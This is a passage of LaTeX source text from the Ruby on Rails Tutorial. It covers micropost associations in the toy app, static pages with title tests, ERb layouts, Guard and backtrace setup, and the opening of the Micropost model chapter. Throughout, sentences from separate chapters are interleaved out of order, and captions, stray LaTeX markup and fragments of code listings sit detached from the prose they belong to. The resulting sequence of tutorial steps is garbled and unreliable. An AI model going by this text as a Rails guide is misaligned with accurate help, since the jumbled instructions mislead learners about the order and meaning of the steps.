We see from the highlighted lines in Listing~\ref{code:about_test} that the test for the About page is the same as the Home and Help tests with the word ``about'' in place of ``home'' or ``help''.
The code in Listing~\ref{code:demo_length_validation} may look rather mysterious---we'll cover validations more thoroughly starting in Section~\ref{sec:user_validations}---but its effects are readily apparent if we go to the new micropost page and enter more than 140 characters for the content of the post.
As required, the test initially fails:
As seen in Figure~\ref{fig:micropost_length_error}, Rails renders \emph{error messages} indicating that the micropost's content is too long.
$ bundle exec rake test<n>3 tests, 2 assertions, 0 failures, 1 errors, 0 skips
(We'll learn more about error messages in Section~\ref{sec:signup_error_messages}.)
Error messages for a failed micropost creation.
One of the most powerful features of Rails is the ability to form \emph{associations} between different data models.
In the case of our User model, each user potentially has many microposts.
We can get started by examining the error message output by the failing test
We can express this in code by updating the User and Micropost models as in Listing~\ref{code:demo_user_has_many_microposts} and Listing~\ref{code:demo_micropost_belongs_to_user}.
On some systems, you may have to scroll past the ``stack trace'' or ``backtrace'' that traces the error's path through the source code.
A user has many microposts.
See Section~\ref{sec:backtrace_silencer} for information on how to filter this backtrace to eliminate unwanted lines.
A micropost belongs to a user.
$ bundle exec rake test<n>ActionController::UrlGenerationError:<n>No route matches {:action=>"about", :controller=>"static_pages"}
We can visualize the result of this association in Figure~\ref{fig:micropost_user_association}.
The error message here says that no route matches the desired action/controller combination, which is a hint that we need to add a line to the routes file.
Because of the \kode{user\_id} column in the \kode{microposts} table, Rails (using Active Record) can infer the microposts associated with each user.
We can accomplish this by following the pattern in Listing~\ref{code:pages_routes}, as shown in Listing~\ref{code:about_route}.
The association between microposts and users.
Adding the \kode{about} route. 
In Chapter~\ref{cha:user_microposts} and Chapter~\ref{cha:following_users}, we will use the association of users and microposts both to display all of a user's microposts and to construct a Twitter-like micropost feed.
For now, we can examine the implications of the user-micropost association by using the \emph{console}, which is a useful tool for interacting with Rails applications.
$ bundle exec rake test<n>AbstractController::ActionNotFound:<n>The action 'about' could not be found for StaticPagesController
We first invoke the console with \kode{rails console} at the command line, and then retrieve the first user from the database using \kode{User.first} (putting the results in the variable \kode{first\_user})
The error message now indicates a missing \kode{about} action in the Static Pages controller, which we can add by following the model provided by \kode{home} and \kode{help} in Listing~\ref{code:static_pages_controller}, as shown in Listing~\ref{code:adding_the_about_page}.
The Static Pages controller with added \kode{about} action. 
=> [#<Micropost id: 1, content: "First micropost!", user_id: 1, created_at:
micropost.user
$ bundle exec rake test<n>ActionView::MissingTemplate: Missing template static_pages/about
(I include \kode{exit} in the last line just to demonstrate how to exit the console.
This indicates a missing template, which in the context of Rails is essentially the same thing as a view.
On most systems, you can also use Ctrl-D for the same purpose.)
The way to create a file varies by system setup, but most text editors will let you control-click inside the directory where you want to create the file to bring up a menu with a ``New File'' menu item.
Alternately, you can use the File menu to create a new file and then pick the proper directory when saving it.
With this code, Active Record automatically returns all the microposts with \kode{user\_id} equal to the id of \kode{first\_user} (in this case,~\kode{1}).
Finally, you can use my favorite trick by applying the \href{http://en.wikipedia.org/wiki/Touch_(Unix)}{Unix touch command} as follows:
We'll learn much more about the association facilities in Active Record in Chapter~\ref{cha:user_microposts} and Chapter~\ref{cha:following_users}.
Although \kode{touch} is designed to update the modification timestamp of a file or directory without otherwise affecting it, as a side-effect it creates a new (blank) file if one doesn't already exist.
We end our discussion of the toy application with a brief description of the controller and model class hierarchies in Rails.
(If using the cloud IDE, you may have to refresh the file tree as described in Section~\ref{sec:bundler}.)
This discussion will only make much sense if you have some experience with object-oriented programming (OOP); if you haven't studied OOP, feel free to skip this section.
in Listing~\ref{code:custom_about_page}.
In particular, if you are unfamiliar with \emph{classes} (discussed in Section~\ref{sec:ruby_classes}), I suggest looping back to this section at a later time.
We start with the inheritance structure for models.
Code for the About page. 
Comparing  Listing~\ref{code:demo_user_class} and Listing~\ref{code:demo_micropost_class}, we see that both the User model and the Micropost model inherit (via the left angle bracket~\kode{<}) from \kode{ActiveRecord::Base}, which is the base class for models provided by ActiveRecord; a diagram summarizing this relationship appears in Figure~\ref{fig:demo_model_inheritance}.
Ruby on Rails<n>  Tutorial
and so~on.
<n>  This is the sample application for the tutorial.
The \kode{User} class, highlighting inheritance.
At this point, running \kode{rake test} should get us back to \passing:
The \kode{Micropost} class, highlighting inheritance.
$ bundle exec rake test<n>3 tests, 3 assertions, 0 failures, 0 errors, 0 skips
The inheritance hierarchy for the User and Micropost models.
Of course, it's never a bad idea to take a look at the page in a browser to make sure our tests aren't completely crazy (Figure~\ref{fig:about_us}).
The inheritance structure for controllers is only slightly more complicated.
The new About page (\href{http://localhost:3000/static_pages/about}{/static\_pages/about}).
Comparing Listing~\ref{code:demo_users_controller_class} and Listing~\ref{code:demo_microposts_controller_class}, we see that both the Users controller and the Microposts controller inherit from the Application controller.
Now that we've gotten to \passing, we are free to refactor our code with confidence.
Examining Listing~\ref{code:toy_application_controller_class}, we see that \kode{ApplicationController} itself inherits from \kode{ActionController::Base}; this is the base class for controllers provided by the Rails library Action Pack.
When developing an application, often code will start to ``smell'', meaning that it gets ugly, bloated, or filled with repetition.
The relationships between these classes is illustrated in Figure~\ref{fig:demo_controller_inheritance}.
The computer doesn't care what the code looks like, of course, but humans do, so it is important to keep the code base clean by refactoring frequently.
The \kode{UsersController} class, highlighting inheritance.
Although our sample app is a little too small to refactor right now, \href{https://en.wikipedia.org/wiki/Code_smell}{code smell} seeps in at every crack, and we'll get started refactoring in Section~\ref{sec:layouts_and_embedded_ruby}.
<n><n>      % subsubsection refactor (end)<n><n>    % subsection our_first_test<n><n>  % section getting_started_with_testing (end)<n><n><n>  \section{Slightly dynamic pages} % (fold)<n>  \label{sec:slightly_dynamic_pages}<n><n>
The \kode{MicropostsController} class, highlighting inheritance.
Now that we've created the actions and views for some static pages, we'll make them \emph{slightly} dynamic by adding some content that changes on a per-page basis: we'll have the title of each page change to reflect its content.
Whether a changing title represents \emph{truly} dynamic content is debatable, but in any case it lays the necessary foundation for unambiguously dynamic content in Chapter~\ref{cha:sign_up}.
The \kode{ApplicationController} class, highlighting inheritance.
The inheritance hierarchy for the Users and Microposts controllers.
As with model inheritance, both the Users and Microposts controllers gain a large amount of functionality by inheriting from a base class (in this case, \kode{ActionController::Base}), including the ability to manipulate model objects, filter inbound HTTP requests, and render views as HTML. Since all Rails controllers inherit from \kode{ApplicationController}, rules defined in the Application controller automatically apply to every action in the application.
For example, in Section~\ref{sec:remember_me} we'll see how to include helpers for logging in and logging out of all of the sample application's controllers.
With the completion of the Microposts resource, now is a good time to push the repository up to Bitbucket:
Ordinarily, you should make smaller, more frequent commits, but for the purposes of this chapter a single big commit at the end is fine.
At this point, you can also deploy the toy app to Heroku as in Section~\ref{sec:deploying}:
(This assumes you created the Heroku app in Section~\ref{sec:planning_the_application}.
Our plan is to edit the Home, Help, and About pages to make page titles that change on each page.
Otherwise, you should run \kode{heroku create} and then \kode{git push heroku master}.)
This will involve using the \kode{<title>} tag in our page views.
To get the application's database to work, you'll also have to migrate the production database:
Most browsers display the contents of the title tag at the top of the browser window, and it is also important for search-engine optimization.
This updates the database at Heroku with the necessary user and micropost data models.
By the end of this section, all three of our static pages will have titles of the form ``<page name> | Ruby on Rails Tutorial Sample App'', where the first part of the title will vary depending on the page (Table~\ref{table:static_pages}).
After running the migration, you should be able to use the toy app in production, with a real PostgreSQL database back-end (Figure~\ref{fig:toy_app_production}).
The \kode{rails new} command (Listing~\ref{code:rails_new_sample_app}) creates a layout file by default, but it's instructive to ignore it initially, which we can do by changing its name:
Running the toy app in production.
You wouldn't normally do this in a real application, but it's easier to understand the purpose of the layout file if we start by disabling it.
We've come now to the end of the high-level overview of a Rails application.
Base title
The toy app developed in this chapter has several strengths and a host of weaknesses.
Variable title
High-level overview of Rails
Introduction to MVC
First taste of the REST architecture
Beginning data modeling
A live, database-backed web application in production
The (mostly) static pages for the sample app.
No custom layout or styling
\label{table:static_pages}}<n>\end{table}<n><n>    \subsection{Testing titles (Red)} % (fold)<n>    \label{sec:testing_titles}<n><n>
To add page titles, we need to learn (or review) the structure of a typical web page, which takes the form shown in Listing~\ref{code:html_structure}.
No static pages (such as ``Home'' or ``About'')
No user passwords
The HTML structure of a typical web page.
No user images
No logging in
No security
No automatic user/micropost association
No notion of ``following'' or ``followed''
No micropost feed
No meaningful tests
HTML changes with time; by explicitly making a doctype declaration we make it likelier that browsers will render our pages properly in the future.
No real understanding
inside a \kode{p} (paragraph) tag.
(The indentation is optional---HTML is not sensitive to whitespace, and ignores both tabs and spaces---but it makes the document's structure easier to see.)
The rest of this tutorial is dedicated to building on the strengths and eliminating the weaknesses.
We'll write simple tests for each of the titles in Table~\ref{table:static_pages} by combining the tests in Listing~\ref{code:about_test} with the \kode{assert\_select} method, which lets us test for the presence of a particular HTML tag (sometimes called a ``selector'', hence the name)
<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:toy_app_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
"Home | Ruby on Rails Tutorial Sample App"
Scaffolding automatically creates code to model data and interact with it through the web.
In particular, the code above checks for the presence of a \kode{<title>} tag containing the string ``Home | Ruby on Rails Tutorial Sample App''.
Applying this idea to all three static pages gives the tests shown in Listing~\ref{code:title_tests}.
Scaffolding is good for getting started quickly but is bad for understanding.
Rails uses the Model-View-Controller (MVC) pattern for structuring web applications.
The Static Pages controller test with title tests. 
As interpreted by Rails, the REST architecture includes a standard set of URLs and controller actions for interacting with data models.
Rails supports data validations to place constraints on the values of data model attributes.
Rails comes with built-in functions for defining associations between different data models.
We can interact with Rails applications at the command line using the Rails console.
The code in Listing~\ref{code:validates_content_presence} shows how to add a validation for the presence of micropost content in order to ensure that microposts can't be blank.
Verify that you get the behavior shown in Figure~\ref{fig:micropost_content_cant_be_blank}.
Update Listing~\ref{code:toy_user_presence_valications} by replacing \kode{FILL\_IN} with the appropriate code to validate the presence of name and email attributes in the User model (Figure~\ref{fig:user_presence_validations}).
(If the repetition of the base title ``Ruby on Rails Tutorial Sample App'' bothers you, see the exercises in Section~\ref{sec:static_pages_exercises}.)
Code to validate the presence of micropost content.
The effect of a micropost presence validation.
$ bundle exec rake test<n>3 tests, 6 assertions, 3 failures, 0 errors, 0 skips
Adding presence validations to the User model.
Now we'll add a title to each page, getting the tests from Section~\ref{sec:testing_titles} to pass in the process.
Applying the basic HTML structure from Listing~\ref{code:html_structure} to the custom Home page from Listing~\ref{code:custom_home_page} yields Listing~\ref{code:home_view_full_html}.
The effect of presence validations on the User model.
The view for the Home page with full HTML structure. 
<n>      This is the home page for the
<n>      sample application.
The corresponding web page appears in Figure~\ref{fig:home_view_full_html}
Most of the screenshots in this book use Google Chrome, but Figure~\ref{fig:home_view_full_html} uses Safari because Chrome doesn't display the full page title.
The Home page with a title.
Following this model for the Help page (Listing~\ref{code:custom_help_page}) and the About page (Listing~\ref{code:custom_about_page}) yields the code in Listing~\ref{code:help_view_full_html} and Listing~\ref{code:about_view_full_html}.
The view for the Help page with full HTML structure. 
<n>      Get help on the Ruby on Rails Tutorial at the
<n>      To get help on this sample app, see the
Ruby on Rails<n>      Tutorial
The view for the About page with full HTML structure. 
<n>      This is the sample application for the tutorial.
At this point, the test suite should be back to \passing:
$ bundle exec rake test<n>3 tests, 6 assertions, 0 failures, 0 errors, 0 skips
We've achieved a lot already in this section, generating three valid pages using Rails controllers and actions, but they are purely static HTML and hence don't show off the power of Rails.
Moreover, they suffer from terrible duplication:
The page titles are almost (but not quite) exactly the same.
``Ruby on Rails Tutorial Sample App'' is common to all three titles.
The entire HTML skeleton structure is repeated on each page.
This repeated code is a violation of the important ``Don't Repeat Yourself'' (DRY) principle; in this section we'll ``DRY out our code'' by removing the repetition.
At the end, we'll re-run the tests from Section~\ref{sec:adding_page_titles} to verify that the titles are still correct.
Paradoxically, we'll take the first step toward eliminating duplication by first adding some more: we'll make the titles of the pages, which are currently quite similar, match \emph{exactly}.
This will make it much simpler to remove all the repetition at a stroke.
The technique involves using \emph{embedded Ruby} in our views.
Since the Home, Help, and About page titles have a variable component, we'll use a special Rails function called \kode{provide} to set a different title on each page.
in Listing~\ref{code:home_view_erb_title}.
The view for the Home page with an embedded Ruby title. 
Listing~\ref{code:home_view_erb_title} is our first example of embedded Ruby, also called \emph{ERb}.
Experienced Rails developers might have expected the use of \kode{content\_for} at this point, but it doesn't work well with the asset pipeline.
The \kode{provide} function is its replacement.
If you've studied Ruby before, you might suspect that Rails is \emph{yielding} the contents to a block, and your suspicion would be correct.
But you don't need to know this to develop applications with Rails.
The resulting page is exactly the same as before, only now the variable part of the title is generated dynamically by ERb.
We can verify that all this works by running the tests from Section~\ref{sec:adding_page_titles} and see that they are still \passing:
Then we can make the corresponding replacements for the Help and About pages (Listing~\ref{code:help_view_erb_title} and Listing~\ref{code:about_view_erb_title}).
The view for the Help page with an embedded Ruby title. 
The view for the About page with an embedded Ruby title. 
Now that we've replaced the variable part of the page titles with ERb, each of our pages looks something like this:
Contents
In other words, all the pages are identical in structure, including the contents of the title tag, with the sole exception of the material inside the \kode{body} tag.
To get the layout to work, we have to replace the default title with the embedded Ruby from the examples above:
The resulting layout appears in Listing~\ref{code:application_layout}.
Note here the special line
This code is responsible for inserting the contents of each page into the layout.
It's also worth noting that the default Rails layout includes several additional lines:
This code arranges to include the application stylesheet and JavaScript, which are part of the asset pipeline (Section~\ref{sec:the_asset_pipeline}), together with the Rails method \kode{csrf\_meta\_tags}, which prevents \href{http://en.wikipedia.org/wiki/Cross-site_request_forgery}{cross-site request forgery} (CSRF), a type of malicious web attack.
Of course, the views in Listing~\ref{code:home_view_erb_title}, Listing~\ref{code:help_view_erb_title}, and Listing~\ref{code:about_view_erb_title} are still filled with all the HTML structure included in the layout, so we have to remove it, leaving only the interior contents.
The resulting cleaned-up views appear in Listing~\ref{code:home_view_interior}, Listing~\ref{code:help_view_interior}, and Listing~\ref{code:about_view_interior}.
The Home page with HTML structure removed. 
The Help page with HTML structure removed. 
The About page with HTML structure removed. 
With these views defined, the Home, Help, and About pages are the same as before, but they have much less duplication.
Experience shows that even fairly simple refactoring is error-prone and can easily go awry.
This is one reason why having a good test suite is so valuable.
Rather than double-checking every page for correctness---a procedure that isn't too hard early on but rapidly becomes unwieldy as an application grows---we can simply verify that the test suite is still \passing:
This isn't a \emph{proof} that our code is still correct, but it greatly increases the probability, thereby providing a safety net to protect us against future bugs.
Now that we've customized our site's pages and gotten a good start on the test suite, let's set the application's root route before moving on.
As in Section~\ref{sec:hello_world} and Section~\ref{sec:mvc_in_action}, this involves editing the \kode{routes.rb} file to connect / to a page of our choice, which in this case will be the Home page.
(At this point, I also recommend removing the \kode{hello} action from the Application controller if you added it in Section~\ref{sec:sample_app_setup}.)
As shown in Listing~\ref{code:home_root_route}, this means replacing the generated \kode{get} rule from Listing~\ref{code:pages_routes} with the following code:
The resulting routes file is shown in Figure~\ref{fig:home_root_route}.
Setting the root route to the Home page.
The Home page at the root route.
But appearances are deceiving: by developing in terms of Rails controllers, actions, and views, we are now in a position to add arbitrary amounts of dynamic content to our site.
Seeing exactly how this plays out is the task for the rest of this tutorial.
Before moving on, let's take a minute to commit the changes on our topic branch and merge them into the master branch.
Back in Section~\ref{sec:static_pages} we created a Git branch for the development of static pages.
If you haven't been making commits as we've been moving along, first make a commit indicating that we've reached a stopping point:
Then merge the changes back into the master branch using the same technique as in Section~\ref{sec:git_commands}
If you get an error message saying that the Spring process id (pid) file would be overwritten by the merge, just remove the file using \kode{rm -f *.pid} at the command line.
Once you reach a stopping point like this, it's usually a good idea to push your code up to a remote repository (which, if you followed the steps in Section~\ref{sec:bitbucket}, will be Bitbucket):
I also recommend deploying the application to Heroku:
Here we've taken care to run the test suite before deploying, which is a good habit to develop.
<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:static_pages_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
For a third time, we went through the full procedure of creating a new Rails application from scratch, installing the necessary gems, pushing it up to a remote repository, and deploying it to production.
The \kode{rails} script generates a new controller with \kode{rails generate controller ControllerName <optional action names>}.
New routes are defined in the file \kode{config/routes.rb}.
Automated testing allows us to write test suites that drive the development of new features, allow for confident refactoring, and catch regressions.
Test-driven development uses a ``Red, Green, Refactor'' cycle.
Rails layouts allow the use of a common template for pages in our application, thereby eliminating duplication.
From this point until the end of the tutorial, I recommend solving the exercises on a separate topic branch:
This practice will prevent conflicts with the main tutorial.
Once you're satisfied with your solutions, you can push up the exercises branch to a remote repository (if you've set one up):
(As preparation for future development, the last step here checks out the master branch, but we \emph{don't} merge in the changes in order to avoid conflicts with the rest of the tutorial.)
In future chapters, the branches and commit messages will differ, of course, but the basic idea is the same.
You may have noticed some repetition in the Static Pages controller test (Listing~\ref{code:title_tests}).
In particular, the base title, ``Ruby on Rails Tutorial Sample App'', is the same for every title test. Using the special function \kode{setup}, which is automatically run before every test, verify that the tests in Listing~\ref{code:base_title_test} are still \passing.
(Listing~\ref{code:base_title_test} uses an \emph{instance variable}, seen briefly in Section~\ref{sec:mvc_in_action} and covered further in Section~\ref{sec:a_user_class}, combined with \emph{string interpolation}, which is covered further in Section~\ref{sec:strings}.)
Make a Contact page for the sample app.
This exercise is solved in Section~\ref{sec:contact_page}.
Get your test to pass by following the same steps as when making the About page in Section~\ref{sec:green}, including filling the Contact page with the content from Listing~\ref{code:proposed_contact_page}.
(Note that, to keep the exercises independent, Listing~\ref{code:proposed_contact_page} doesn't incorporate the changes made in Listing~\ref{code:base_title_test}.)
The Static Pages controller test with a base title. 
Code for a proposed Contact page.
This optional section describes the testing setup used in the \href{http://screencasts.railstutorial.org/}{Ruby on Rails Tutorial screencast series}.
There are three main elements: an enhanced pass/fail reporter (Section~\ref{sec:minitest_reporters}), a utility to filter the backtrace produced by failing tests (Section~\ref{sec:backtrace_silencer}), and an automated test runner that detects file changes and automatically runs the corresponding tests (Section~\ref{sec:guard}).
The code in this section is advanced and is presented for convenience only; you are not expected to understand it at this time.
The changes in this section should be made on the master branch:
The code in Listing~\ref{code:minitest_reporters} mixes single- and double-quoted strings.
This mixing of the two string types is common in Ruby; see Section~\ref{sec:strings} for more information.
in Listing~\ref{code:gemfile_sample_app}.
Upon encountering an error or failing test, the test runner shows a ``stack trace'' or ``backtrace'' that traces the course of a failed test through the application.
While this backtrace is usually very useful for tracking down the problem, on some systems (including the cloud IDE) it goes past the application code and into the various gem dependencies, including Rails itself.
The resulting backtrace is often inconveniently long, especially since the source of the problem is usually the application and not one of its dependencies.
The solution is to filter the backtrace to eliminate unwanted lines.
This requires the \href{https://github.com/metaskills/mini_backtrace}{\texttt{mini\_backtrace}} gem included in Listing~\ref{code:gemfile_sample_app}, combined with a \emph{backtrace silencer}.
On the cloud IDE, most unwanted lines contain the string \kode{rvm} (referring to the Ruby Version Manager), so I recommend using the silencer shown in Listing~\ref{code:backtrace_silencer} to filter them out.
Adding a backtrace silencer for RVM.
# Be sure to restart your server when you modify this file.
# Rails.backtrace_cleaner.remove_silencers!
As noted in a comment in Listing~\ref{code:backtrace_silencer}, you should restart the local webserver after adding the silencer.
One annoyance associated with using the \kode{rake test} command is having to switch to the command line and run the tests by hand.
To avoid this inconvenience, we can use \href{https://github.com/guard/guard}{\emph{Guard}} to automate the running of the tests.
Guard monitors changes in the filesystem so that, for example, when we change the \kode{static\_pages\_controller\_test.rb} file, only those tests get run.
$ bundle exec guard init<n>Writing new Guardfile to /home/ubuntu/workspace/sample_app/Guardfile<n>00:51:32 - INFO - minitest guard added to Guardfile, feel free to edit it
We then edit the resulting \kode{Guardfile} so that Guard will run the right tests when the integration tests and views are updated (Listing~\ref{code:guardfile}).
(Given its length and advanced nature, I recommend just copy-and-pasting the contents of Listing~\ref{code:guardfile}.)
A custom \kode{Guardfile}.
# Defines the matching rules for Guard.
Here the line
causes Guard to use the Spring server supplied by Rails to speed up loading times, while also preventing Guard from running the full test suite upon starting.
To prevent conflicts between Spring and Git when using Guard, you should add the \kode{spring/} directory to the \kode{.gitignore} file used by Git to determine what to ignore when adding files or directories to the repository.
The way to do this using the cloud IDE is as follows:
Click on the gear icon in the upper right part of the file navigation pane (Figure~\ref{fig:file_navigator_gear_icon}).
Select ``Show hidden files'' to show the \kode{.gitignore} file in the application's root directory (Figure~\ref{fig:show_hidden_files}).
Double-click on the \kode{.gitignore} file (Figure~\ref{fig:gitignore}) to open it, and then fill it with the contents of Listing~\ref{code:gitignore_spring}.
The (rather subtle) gear icon in the file navigator pane.
Showing hidden files in the file navigator.
The normally hidden \kode{.gitignore} file made visible.
Adding Spring to the \kode{.gitignore} file.
# See https://help.github.com/articles/ignoring-files for more about ignoring<n># files.
<n>#<n># If you find yourself ignoring temporary files generated by your text editor<n># or operating system, you probably want to add a global ignore instead:<n>#   git config --global core.excludesfile '~/.gitignore_global'<n><n># Ignore bundler config.
<n>/.bundle<n><n># Ignore the default SQLite database.
<n>/db/*.sqlite3<n>/db/*.sqlite3-journal<n><n># Ignore all logfiles and tempfiles.
<n>/log/*.log<n>/tmp<n><n># Ignore Spring files.
The Spring server is still a little quirky as of this writing, and sometimes Spring \emph{processes} will accumulate and slow performance of your tests.
Unix processes
On Unix-like systems such as Linux and OS X, user and system tasks each take place within a well-defined container called a \emph{process}.
To see all the processes on your system, you can use the \texttt{ps} command with the \texttt{aux} options:
<n>  $ ps aux
To filter the processes by type, you can run the results of \texttt{ps} through the \texttt{grep} pattern-matcher using a Unix pipe~\texttt{|}:
<n>  $ ps aux | grep spring<n>  ubuntu 12241 0.3 0.5 589960 178416 ?
Ssl Sep20 1:46<n>  spring app | sample_app | started 7 hours ago
The result shown gives some details about the process, but the most important thing is the first number, which is the \emph{process id}, or pid.
To eliminate an unwanted process, use the \texttt{kill} command to issue the Unix kill code (which \href{https://en.wikipedia.org/wiki/Unix_signal#List_of_signals}{happens to be~9}) to the pid:
This is the technique I recommend for killing individual processes, such as a rogue Rails server (with the pid found via \texttt{ps aux | grep server}), but sometimes it's convenient to kill all the processes matching a particular process name, such as when you want to kill all the \texttt{spring} processes gunking up your system.
In this particular case, you should first try stopping the processes with the \texttt{spring} command itself:
<n>  $ spring stop
Sometimes this doesn't work, though, and you can kill all the processes with name \texttt{spring} using the \texttt{pkill} command as follows:
Once Guard is configured, you should open a new terminal and (as with the Rails server in Section~\ref{sec:rails_server}) run it at the command line as follows:
$ bundle exec guard
The rules in Listing~\ref{code:guardfile} are optimized for this tutorial, automatically running (for example) the integration tests when a controller is changed.
To run \emph{all} the tests, hit return at the \kode{guard>} prompt.
(This may sometimes give an error indicating a failure to connect to the Spring server.
To fix the problem, just hit return again.)
To exit Guard, press Ctrl-D. To add additional matchers to Guard, refer to the examples in Listing~\ref{code:guardfile}, the \href{https://github.com/guard/guard}{Guard README}, and the \href{https://github.com/guard/guard/wiki}{Guard wiki}.
In the course of developing the core sample application, we've now encountered four resources---users, sessions, account activations, and password \linebreak resets---but only the first of these is backed by an Active Record model with a table in the database.
The time has finally come to add a second such resource: user \emph{microposts}, which are short messages associated with a particular user
The name is motivated by the common description of Twitter as a \emph{microblog}; since blogs have posts, microblogs should have microposts.
 We first saw microposts in larval form in Chapter~\ref{cha:a_toy_app}, and in this chapter we will make a full-strength version of the sketch from Section~\ref{sec:microposts_resource} by constructing the Micropost data model, associating it with the User model using the \kode{has\_many} and \kode{belongs\_to} methods, and then making the forms and partials needed to manipulate and display the results (including, in Section~\ref{sec:micropost_images}, uploaded images).
In Chapter~\ref{cha:following_users}, we'll complete our tiny Twitter clone by adding the notion of \emph{following} users in order to receive a \emph{feed} of their microposts.
<n><n>  \section{A Micropost model} % (fold)<n>  \label{sec:a_micropost_model}<n><n>
We begin the Microposts resource by creating a Micropost model, which captures the essential characteristics of microposts.
What follows builds on the work from Section~\ref{sec:microposts_resource}; as with the model in that section, our new Micropost model will include data validations and an association with the User model.
Unlike that model, the present Micropost model will be fully tested, and will also have a default \emph{ordering} and automatic \emph{destruction} if its parent user is destroyed.
If you're using Git for version control, I suggest making a topic branch at this time:
user-microposts
<n>\end{code}<n><n>    \subsection{The basic model} % (fold)<n>    \label{sec:the_basic_model}<n><n>
The Micropost model needs only two attributes: a \kode{content} attribute to hold the micropost's content and a \kode{user\_id} to associate a micropost with a particular user.
The result is a Micropost model with the structure shown in Figure~\ref{fig:micropost_model}.
The Micropost data model.
It's worth noting that the model in Figure~\ref{fig:micropost_model} uses the \kode{text} data type for micropost content (instead of \kode{string}), which is capable of storing an arbitrary amount of text.
Even though the content will be restricted to fewer than 140 characters (Section~\ref{sec:micropost_validations}) and hence would fit inside the 255-character \kode{string} type, using \kode{text} better expresses the nature of microposts, which are more naturally thought of as blocks of text.
Indeed, in Section~\ref{sec:creating_microposts} we'll use a text \emph{area} instead of a text field for submitting microposts.
In addition, using \kode{text} gives us greater flexibility should we wish to increase the length limit at a future date (as part of internationalization, for example).
As with the case of the User model (Listing~\ref{code:generate_user_model}), we generate the Micropost model using \kode{generate model}:
The \kode{generate} command produces a migration to create a \kode{microposts} table in the database (Listing~\ref{code:micropost_migration}); compare it to the analogous migration for the \kode{users} table from Listing~\ref{code:users_migration}.
The foreign key reference is a database-level constraint indicating that the user id in the microposts table refers to the id column in the users table.
This detail will never be important in this tutorial, and the foreign key constraint isn't even supported by all databases.
(It's supported by PostgreSQL, which we use in production, but not by the development SQLite database adapter.)
We'll learn more about foreign keys in Section~\ref{sec:relationship_user_associations}.
As with the User model, the Micropost model migration automatically includes the \kode{t.timestamps} line, which (as mentioned in Section~\ref{sec:database_migrations}) adds the magic \kode{created\_at} and \kode{updated\_at} columns shown in Figure~\ref{fig:micropost_model}.
(We'll put the \kode{created\_at} column to work in Section~\ref{sec:ordering_and_dependency} and Section~\ref{sec:rendering_microposts}.)
The Micropost migration with added index.
By including both the \kode{user\_id} and \kode{created\_at} columns as an array, we arrange for Rails to create a \emph{multiple key index}, which means that Active Record uses \emph{both} keys at the same time.
With the migration in Listing~\ref{code:micropost_migration}, we can update the database as usual:
Now that we've created the basic model, we'll add some validations to enforce the desired design constraints.
One of the necessary aspects of the Micropost model is the presence of a user id to indicate which user made the micropost.
The idiomatically correct way to do this is to use Active Record \emph{associations}, which we'll implement in Section~\ref{sec:user_micropost_associations}, but for now we'll work with the \kode{Micropost} model directly.
The initial micropost tests parallel those for the User model (Listing~\ref{code:name_presence_test}).
In the \kode{setup} step, we create a new micropost while associating it with a valid user from the fixtures, and then check that the result is valid.
Because every micropost should have a user id, we'll add a test for a \kode{user\_id} presence validation.
Putting these elements together yields the test in Listing~\ref{code:micropost_validity_test}.
Tests for the validity of a new micropost. 
# This code is not idiomatically correct.
As indicated by the comment in the \kode{setup} method, the code to create the micropost is not idiomatically correct, which we'll fix in Section~\ref{sec:user_micropost_associations}.
To fix this, we just need to add the user id presence validation shown in Listing~\ref{code:micropost_user_id_validation}.
(Note the \kode{belongs\_to} line in Listing~\ref{code:micropost_user_id_validation}, which is generated automatically by the migration in Listing~\ref{code:micropost_migration}.
Section~\ref{sec:user_micropost_associations} discusses the effects of this line in more depth.)
A validation for the micropost's \kode{user\_id}. 
The model tests should now be \passing:
Next, we'll add validations for the micropost's \kode{content} attribute (following the example from Section~\ref{sec:putting_the_micro_in_microposts}).
As with the \kode{user\_id}, the \kode{content} attribute must be present, and it is further constrained to be no longer than 140 characters, making it an honest \emph{micro}post.
We'll first write some simple tests, which generally follow the examples from the User model validation tests in Section~\ref{sec:user_validations}, as shown in Listing~\ref{code:micropost_validations_tests}.
Tests for the Micropost model validations. 
As in Section~\ref{sec:user_validations}, the code in Listing~\ref{code:micropost_validations_tests} uses string multiplication to test the micropost length validation:
=> "aaaaaaaaaa"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
The corresponding application code is virtually identical to the \kode{name} validation for users (Listing~\ref{code:length_validation}), as shown in Listing~\ref{code:micropost_validations}.
The Micropost model validations. 
When constructing data models for web applications, it is essential to be able to make \emph{associations} between individual models.
In the present case, each micropost is associated with one user, and each user is associated with (potentially) many microposts---a relationship seen briefly in Section~\ref{sec:demo_user_has_many_microposts} and shown schematically in Figure~\ref{fig:micropost_belongs_to_user} and Figure~\ref{fig:user_has_many_microposts}.
As part of implementing these associations, we'll write tests for the Micropost model and add a couple of tests to the User model.
The \kode{belongs\_to} relationship between a micropost and its associated user.
The \kode{has\_many} relationship between a user and its microposts.
Using the \kode{belongs\_to}/\kode{has\_many} association defined in this section, \linebreak Rails constructs the methods shown in Table~\ref{table:association_methods}.
Note from Table~\ref{table:association_methods} that instead of
These latter methods constitute the idiomatically correct way to make a micropost, namely, \emph{through} its association with a user.
When a new micropost is made in this way, its \kode{user\_id} is automatically set to the right value.
In particular, we can replace the code
from Listing~\ref{code:micropost_validity_test} with this:
(As with \kode{new}, \kode{build} returns an object in memory but doesn't modify the database.)
Once we define the proper associations, the resulting \kode{@micropost} variable will automatically have a \kode{user\_id} attribute equal to its associated user's id.
Returns the User object associated with the micropost
Returns a collection of the user's microposts
Creates a micropost associated with \kode{user}
Creates a micropost associated with \kode{user} (exception on failure)
Returns a new Micropost object associated with \kode{user}
Finds the micropost with id~\kode{1} and \kode{user\_id} equal to \kode{user.id}
A summary of user/micropost association methods.
To get code like \kode{@user.microposts.build} to work, we need to update the User and Micropost models with code to associate them.
The first of these was included automatically by the migration in Listing~\ref{code:micropost_migration} via \kode{belongs\_to :user}, as shown in Listing~\ref{code:micropost_belongs_to_user}.
A micropost \kode{belongs\_to} a user. 
A user \kode{has\_many} microposts. 
With the association thus made, we can update the \kode{setup} method in Listing~\ref{code:micropost_validity_test} with the idiomatically correct way to build a new micropost, as shown in Listing~\ref{code:micropost_validity_test_idiomatic}.
Using idiomatically correct code to build a micropost. 
